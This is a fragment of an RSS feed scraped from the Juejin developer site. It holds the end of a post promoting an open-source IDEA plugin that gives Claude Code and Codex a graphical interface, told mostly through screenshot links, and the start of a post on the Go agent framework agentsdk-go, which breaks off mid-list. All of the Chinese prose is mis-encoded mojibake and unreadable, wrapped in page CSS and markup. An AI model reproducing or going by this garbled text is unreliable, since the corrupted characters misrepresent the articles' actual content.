.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€.å‰è¨€ä»‹ç»</h2>
<h3 data-id="heading-1">1.é¡¹ç›®äº§ç”ŸåŸå› </h3>
<p>æˆ‘ä½¿ç”¨claude codeæ¯”è¾ƒé¢‘ç¹ï¼Œè¿‘æœŸæœ‰ä½¿ç”¨IDEAæ’ä»¶çš„éœ€æ±‚ï¼Œæˆ‘å‘ç°IDEAæ’ä»¶ä¸­æ²¡æœ‰ä¸€ä¸ªå¯è§†åŒ–æ“ä½œclaude codeçš„å·¥å…·ï¼Œvscodeä¸­å®˜æ–¹å·²ç»æœ‰äº†ï¼Œè¿™è®©æˆ‘å¾ˆå¥‡æ€ªï¼Œäºæ˜¯å¼€å§‹ç€æ‰‹åšäº†ä¸€ä¸‹ï¼Œç»è¿‡ä¸€ä¸ªæœˆçš„è¿­ä»£ï¼Œç›®å‰å·²ç»æ¯”è¾ƒå®Œå–„äº†ï¼Œåˆ†äº«ç»™å¤§å®¶ä½¿ç”¨</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c46c3dade558492a846f99bfcad6aa36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=bdZFBvoEJ8rWZ5OW7dXCYJtDhiE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å¼€æºåœ°å€</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhukunpenglinyutong%2Fidea-claude-code-gui" target="_blank" title="https://github.com/zhukunpenglinyutong/idea-claude-code-gui" ref="nofollow noopener noreferrer">github.com/zhukunpenglâ€¦</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12f403277d0e4898a8ecbba3ecacccdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=Nqjfcvf%2FrSsdx19Js8%2B4Qjvenqk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">å•†åº—åŒ…ä¸‹è½½åœ°å€</h3>
<p>æœ¬æ’ä»¶å·²ä¸Šæ¶ Jetbrains å¸‚åœºï¼Œæœç´¢claude code gui å®‰è£…å³å¯</p>
<p>æœ¬é¡¹ç›®ä¸å«ä»»ä½•å•†ä¸šåŒ–å†…å®¹å’Œé¢å¤–æ¥å£ï¼Œçº¯è§†å›¾å±‚GUIï¼Œè¯·æ”¾å¿ƒä½¿ç”¨</p>
<blockquote>
<p>å£°æ˜ï¼šæ”¿åºœéƒ¨é—¨ï¼Œå›½ä¼ï¼Œå­¦æ ¡ ä¿®æ”¹æœ¬é¡¹ç›®ä»£ç ï¼Œå¯éµå¾ªMITåè®®ï¼Œä¸éœ€è¦éµå®ˆAGPL-3.0åè®®</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8baf1f3a9439456ea72cc9f46540bce7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=s49f0%2BKAycT7TSg%2BZ0Ji9CwAq9Y%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">äºŒ.åŠŸèƒ½ä»‹ç»</h2>
<h3 data-id="heading-5">1.è¾“å…¥æ¡†</h3>
<blockquote>
<p>1.æ”¯æŒéå¸¸ä¼˜é›…çš„æ–‡ä»¶å¼•ç”¨å±•ç¤º</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/219591197a334a7e8d9c3929eb108552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=6Km9JjdMPMYAs6vSHWClGccyaRM%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>2.æ”¯æŒæ¨¡å¼åˆ‡æ¢</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96f6ba50c8524ee5906e0b876c7ef422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=DCLxT7%2F0nl%2BWsjQ%2FvkUrAizfPY8%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>3.æ”¯æŒæ¨¡å‹åˆ‡æ¢ï¼ˆæ”¯æŒæ˜ å°„ï¼Œå¯æ˜ å°„ä¸ºGLMæ¨¡å‹å‹å·ï¼‰</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3baeddebb43b4d588986c82b1098ebe5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=oC%2FjrGvt7Epr%2BQL6f5tEPsEQnqY%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>4.æ›´å¤šåŠŸèƒ½ï¼ˆæ€è€ƒï¼Œæ™ºèƒ½ä½“ï¼Œä¾›åº”å•†ï¼ŒMCPï¼ŒClaude Codeåˆ‡æ¢ï¼‰ç­‰ç­‰</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/815421e7b4614ffdbc1f381b5fcd5332~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=DVsoXv37U%2BxMqKrloOjyXxmtNDQ%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.å¯¹è¯UIå±•ç¤ºåŒºåŸŸ</h3>
<blockquote>
<p>éå¸¸ä¼˜é›…çš„é¡µé¢å±•ç¤ºï¼Œæˆ‘è®¤ä¸ºç¬¦åˆæˆ‘çš„å®¡ç¾å’Œéœ€è¦</p>
</blockquote>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æ”¯æŒæ€è€ƒè¿‡ç¨‹</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æ”¯æŒå·¥å…·å±•ç¤ºï¼ˆå¸¦ä¾¿æ·ICONå±•ç¤ºï¼‰</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æ”¯æŒä»»åŠ¡åˆ—è¡¨å±•ç¤º</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æ”¯æŒDIFFå±•ç¤º</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ......</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a0ad269a91d438198c87268efbddaae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=iK%2F7pQZNP%2Bl6cZSGqIQAjYRNkck%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.å†å²è®°å½•</h3>
<blockquote>
<p>æ”¯æŒå®Œæ•´çš„å†å²è®°å½•åŠŸèƒ½</p>
</blockquote>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æŸ¥çœ‹å†å²è®°å½•</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> åˆ é™¤å†å²è®°å½•</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä»å†å²è®°å½•è¿›è¡Œå¯¹è¯</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¿®æ”¹å†å²è®°å½•åç§°</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ä¸‹è½½å†å²è®°å½•</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> æ”¶è—å†å²è®°å½•</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> ......</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8818be5a1d4c9db01d6987cabe915b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=PQeXXmZtvYV2XLVfGvC6lWYMCLo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">4.è®¾ç½®é¡µé¢</h3>
<blockquote>
<p>ä¸Šé¢å†…å®¹å·²ç»å¤Ÿå¤šäº†ï¼Ÿè®©æˆ‘å†åŠ ğŸ¤ğŸ» è®¾ç½®ç»†èŠ‚</p>
</blockquote>
<p>åŸºç¡€é…ç½®
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b1b738e17f457ca59ab9e2aba7efea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=ouyqVnwJsJ3iIplcR2TFyujN9so%3D" alt="image.png" loading="lazy"/></p>
<p>ä¾›åº”å•†ç®¡ç†
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9632278ccff4a86a0be8f6dade745ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=WWcJMzDj7qGRAUfdyyj80AEdXtY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6b7f4b760ba4601a1300c940a648b58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=0m4pfnqAtGB0w4RdazO%2BXQ%2BlHDE%3D" alt="image.png" loading="lazy"/></p>
<p>ä½¿ç”¨ç»Ÿè®¡
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37d9db44479d43d78a6f9857c17711e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=gISNBygZIW53I7gBJjvxuOJXawk%3D" alt="image.png" loading="lazy"/></p>
<p>MCPæœåŠ¡å™¨
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5e6c595dfbe4f52a7ac6985bd06d805~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=Zv3aX%2BTlMknhw%2FrWpJOVic%2Bhhmw%3D" alt="image.png" loading="lazy"/></p>
<p>æ™ºèƒ½ä½“
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c418136ff3fc4af586c58702b485bf46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=pj4w4dyHZU%2F7oOLZyC%2B%2FkXB3MLM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ced4d3be4e3458da153f6c529df3e37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=BbDxQohvbLcyQsQSDDKnwCHQIRY%3D" alt="image.png" loading="lazy"/></p>
<p>SKills
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41999d5cfae54f25bf8e61e5a70aa7a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=mC%2FnJPcfqWMQN6dWRLJ%2F2%2FCr8qQ%3D" alt="image.png" loading="lazy"/></p>
<p>......</p>
<h3 data-id="heading-9">5.Codexï¼ˆæ²¡é”™ï¼Œä¹Ÿæ”¯æŒäº†ï¼‰</h3>
<blockquote>
<p>ä¸Šé¢åŠŸèƒ½å·²ç»å¤Ÿå¤šäº†ï¼Ÿç°åœ¨æˆ‘ä»¬ä¹Ÿæ”¯æŒCodexäº†ï¼Œä¸Šé¢åŠŸèƒ½æˆ‘ä»¬å…¨éƒ¨é€‚é…äº†ä¸€éCodexï¼Œå¹¶ä¸”å¯ä»¥åœ¨æœ¬æ’ä»¶éå¸¸ä¼˜é›…çš„è¿›è¡Œåˆ‡æ¢</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9c1d0e13dd4c4c9335a8666d30ffcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=l3KSpnSt6zqeyqvzLb%2F7CXnLa7g%3D" alt="Video-detail-page (1).gif" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c142608dc27e44258d2c6f9d0209670c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=XF%2BFGir4hqi7ICkf%2FlCX36pdvSs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10">ä¸‰.åç»­è®¡åˆ’</h2>
<p>è®¡åˆ’åœ¨æ˜é‡‘å¹³å° åˆ†äº«æœ¬æ’ä»¶é¡¹ç›®çš„ä¸€äº›å®ç°åŸç†ï¼Œå’Œä½¿ç”¨claude codeå¼€å‘æœ¬æ’ä»¶çš„å®è·µç»éªŒå’Œé‡‡å‘æŒ‡å—</p>
<blockquote>
<p>æœ¬æ’ä»¶åœ¨æé€Ÿæ›´æ–°ä¸­ï¼Œæ¯å¤©é¢„è®¡å‘å¸ƒ1ç‰ˆï¼Œä½¬å‹ä»¬æƒ³è¦ä»€ä¹ˆæ–°åŠŸèƒ½ï¼Œéšæ—¶åœ¨æ­¤å¸–ä¸­è‰¾ç‰¹æˆ‘å“¦~</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">å››.è‡´è°¢</h2>
<p>æ„Ÿè°¢æ‰€æœ‰å¸®åŠ© IDEA-Claude-Code-GUI å˜å¾—æ›´å¥½çš„è´¡çŒ®è€…ï¼å’Œæ„Ÿè°¢æ˜é‡‘æŠ€æœ¯å¹³å°</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5812a86059ff49a588b18fe47c331419~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5piG6bmP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531730&amp;x-signature=RiBtgDssmbb9PbooAu6fc%2FUruE0%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[agentsdk-goï¼šå®Œæ•´çš„ Claude Code æ¶æ„ Agent å¼€å‘æ¡†æ¶]]></title>    <link>https://juejin.cn/post/7592873628585705472</link>    <guid>https://juejin.cn/post/7592873628585705472</guid>    <pubDate>2026-01-09T01:56:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592873628585705472" data-draft-id="7592853243731329064" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="agentsdk-goï¼šå®Œæ•´çš„ Claude Code æ¶æ„ Agent å¼€å‘æ¡†æ¶"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2026-01-09T01:56:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜Ÿçº¬æ™ºè”æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/4336129589911223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            agentsdk-goï¼šå®Œæ•´çš„ Claude Code æ¶æ„ Agent å¼€å‘æ¡†æ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129589911223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜Ÿçº¬æ™ºè”æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T01:56:40.000Z" title="Fri Jan 09 2026 01:56:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">agentsdk-goï¼šå®Œæ•´çš„ Claude Code æ¶æ„ Agent å¼€å‘æ¡†æ¶</h2>
<h3 data-id="heading-1">TL;DR</h3>
<p>agentsdk-go æ˜¯ä¸€ä¸ªç”¨ Go å®ç°çš„ Agent å¼€å‘æ¡†æ¶ï¼Œå®Œæ•´ç§»æ¤äº† Claude Code çš„ä¸ƒå¤§æ ¸å¿ƒèƒ½åŠ›ï¼ˆHooksã€MCPã€Sandboxã€Skillsã€Subagentsã€Commandsã€Pluginsï¼‰ï¼Œå¹¶æ‰©å±•äº†å…­å±‚ä¸­é—´ä»¶æ‹¦æˆªæœºåˆ¶ã€‚ç›¸æ¯” LangGraph çš„é»‘ç›’æ¶æ„å’Œ Claude Agent SDK çš„èµ„æºå ç”¨é—®é¢˜ï¼Œagentsdk-go æä¾›äº†æ›´é€æ˜çš„å®ç°ã€æ›´ä½çš„èµ„æºæ¶ˆè€—å’Œæ›´çµæ´»çš„æ‰©å±•èƒ½åŠ›ã€‚æ ¸å¿ƒä»£ç  20,300 è¡Œï¼ŒAgent ä¸»å¾ªç¯ä»… 189 è¡Œï¼Œæµ‹è¯•è¦†ç›–ç‡è¾¾ 90-93%ã€‚</p>
<h3 data-id="heading-2">ä¸€ã€agentsdk-go æ˜¯ä»€ä¹ˆ</h3>
<h4 data-id="heading-3">æ ¸å¿ƒå®šä½</h4>
<p>agentsdk-go æ˜¯åŸºäº Claude Code å®Œæ•´æ¶æ„è®¾è®¡çš„ Agent å¼€å‘æ¡†æ¶ï¼Œé¢å‘ç”Ÿäº§ç¯å¢ƒçš„ CLIã€CI/CD å’Œä¼ä¸šå¹³å°éƒ¨ç½²åœºæ™¯ã€‚å®ƒä¸æ˜¯ç®€å•çš„ LLM è°ƒç”¨å°è£…ï¼Œè€Œæ˜¯æä¾›äº†å®Œæ•´çš„ Agent å·¥ç¨‹èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-4">æŠ€æœ¯æŒ‡æ ‡</h4>
<ul>
<li>â€¢ <strong>ä»£ç è§„æ¨¡</strong>ï¼šçº¦ 20,300 è¡Œç”Ÿäº§ä»£ç ï¼ˆä¸å«æµ‹è¯•ï¼‰</li>
<li>â€¢ <strong>æ ¸å¿ƒå¤æ‚åº¦</strong>ï¼šAgent ä¸»å¾ªç¯ 189 è¡Œ</li>
<li>â€¢ <strong>æµ‹è¯•è¦†ç›–ç‡</strong>ï¼šå…­å¤§æ ¸å¿ƒæ¨¡å—å‡è¾¾ 90-93%ï¼ˆsubagents 91.7%ï¼Œapi 91.0%ï¼Œmcp 90.3%ï¼Œmodel 92.2%ï¼Œsandbox 90.5%ï¼Œsecurity 90.4%ï¼‰</li>
<li>â€¢ <strong>æ¨¡å—åŒ–ç¨‹åº¦</strong>ï¼š13 ä¸ªç‹¬ç«‹åŒ…</li>
<li>â€¢ <strong>å¤–éƒ¨ä¾èµ–</strong>ï¼šanthropic-sdk-goã€fsnotifyã€gopkg.in/yaml.v3ã€google/uuidã€golang.org/x/modã€golang.org/x/net</li>
</ul>
<h4 data-id="heading-5">ç³»ç»Ÿæ¶æ„</h4>
<h5 data-id="heading-6">æ ¸å¿ƒå±‚ï¼ˆ6 ä¸ªæ¨¡å—ï¼‰</h5>
<ol>
<li>
<ol>
<li><strong>pkg/agent</strong>ï¼šAgent æ‰§è¡Œå¾ªç¯ï¼Œåè°ƒæ¨¡å‹è°ƒç”¨å’Œå·¥å…·æ‰§è¡Œ</li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>pkg/middleware</strong>ï¼šå…­å±‚æ‹¦æˆªç‚¹ï¼Œæ‰©å±•è¯·æ±‚/å“åº”ç”Ÿå‘½å‘¨æœŸ</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>pkg/model</strong>ï¼šæ¨¡å‹é€‚é…å™¨ï¼Œå½“å‰æ”¯æŒ Anthropic Claude</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>pkg/tool</strong>ï¼šå·¥å…·æ³¨å†Œå’Œæ‰§è¡Œï¼ŒåŒ…å«å†…ç½®å·¥å…·å’Œ MCP å·¥å…·æ”¯æŒ</li>
</ol>
</li>
<li>
<ol start="5">
<li><strong>pkg/message</strong>ï¼šåŸºäº LRU çš„ä¼šè¯å†å²ç®¡ç†</li>
</ol>
</li>
<li>
<ol start="6">
<li><strong>pkg/api</strong>ï¼šç»Ÿä¸€ API æ¥å£ï¼Œæš´éœ² SDK åŠŸèƒ½</li>
</ol>
</li>
</ol>
<h5 data-id="heading-7">ç‰¹æ€§å±‚ï¼ˆ7 ä¸ªæ¨¡å—ï¼‰</h5>
<ol>
<li>
<ol>
<li><strong>pkg/core/hooks</strong>ï¼šä¸ƒç§ç”Ÿå‘½å‘¨æœŸäº‹ä»¶çš„ Hooks æ‰§è¡Œå™¨</li>
</ol>
</li>
<li>
<ol start="2">
